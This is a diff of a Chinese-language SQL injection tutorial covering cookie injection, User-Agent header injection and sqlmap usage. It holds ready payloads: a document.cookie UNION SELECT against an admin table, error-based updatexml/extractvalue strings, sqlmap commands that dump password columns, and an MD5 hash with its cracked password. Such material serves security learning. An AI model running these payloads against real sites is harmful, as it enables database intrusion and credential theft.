@@ -132,10 +132,41 @@ if(length(database())=12,sleep(5),1) --> 网站延迟显示5秒，说明判断�
 ## 3.cookie注入
 在Cookie处进行注入。
 
-注意：传递的参数需要进行一次URL编码
+当你使用Cookie进行传参的时候 ，传参的值一定要进行URL编码的。
+默认浏览器是会URL编码的。  空格--> %20
+
+如果用的数据库是ACCESS，语法比较正规(select后一定要有from即要先找到一个表名)
+`b9a2a2b5dffb918c -> md5解码-> welcome`
+```
+escape() # 函数，作用：进行URL编码
+document.cookie = "id=" + escape("171 and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin")
+```
 
 ## 4.head注入
+HEAD注入条件是知道用户名密码或登录状态
 
+网络中web访问是以IP数据包形式传输数据，每个数据包由头部（head）和数据体（body）组成，head中有访问者的各种信息。
+
+有的网站他会为了保存我们的信息作为比对会把head头中的信息保存到数据库中以便下一次使用。通讯时我们若能抓到请求数据包，并将头部中身份信息修改则为HEAD注入。抓包实例如下（使用burp）
+
+就像图中User-Agent本意是表示你是哪种访问方式例如苹果、微软、安卓、华为等等，图中我把他的值更换为了一个注入语句，并报错就返回了我关心的结果。
+
+```
+updataxml或extractvalue #报错函数 head注入是通过引起报错，来返回需要的信息，所以不需要回显点
+concat
+```
+下面详细讲解UPDATEXML (XML_document, XPath_string, new_value);
+```
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+第二个参数：XPath_string (Xpath格式的字符串)<--有特定要求格式
+第三个参数：new_value，String格式，替换查找到的符合条件的数据
+作用：改变XML_document文档中符合XPATH_string的值
+```
+注入语句为
+```
+updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+```
+其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出错误`ERROR 1105 (HY000): XPATH syntax error: '得到的数据'`
 ## 5.报错注入
 ```
 'a and nd updatexml(1,concat(0x21,@@version,0x21),1) -- q
@@ -271,23 +302,10 @@ sqlmap偏向于跑盲注
 
 用法：
 ```
-python sqlmap.py -u "输入网址"  #要cd sqlmap.py目录，windows用法
 sqlmap -u "url"  #kali用法
--h #帮助
 sqlmap -u "?id=1&wd=123" -p id,wd #指定测试的参数，默认测试所有参数 --逐参删除法，直到找到影响页面的参数，只能跟-u
 sqlmap -r 1.txt #确定目标网站，1.txt存放burp抓到的请求包
 sqlmap -r 1.txt --data="wd=123,id=1" #确定参数，可以跟-u和-r
-```
-执行时会出现的提示：
-
-```
-`POST parameter 'n' is vulnerable. Do you want to keep testing the others (if any)? #POST参数'n'是脆弱的。 你想继续测试其他人(如果有的话)吗？Y
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')?#是否基于时间注入，选Y
-do you want to (re)try to find proper UNION column types with fuzzy test?#要通过模糊测试找到合适的union列类型吗，Y
-injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? 注入不可利用 NULL 值。是否尝试使用随机整数值作为选项 Y
-
-
-
 ```
 
 当发现网站确实存在漏洞，就可以找数据了
@@ -299,6 +317,7 @@ injection not exploitable with NULL values. Do you want to try with a random int
 --columns   #查询所有的列名
 -C 指定列名 如-D maoshe -T admin -C password --dump
 --dump ：查看数据
+(保存：-s “xx.log”　　恢复:-s “xx.log” --resume)
 ```
 
 
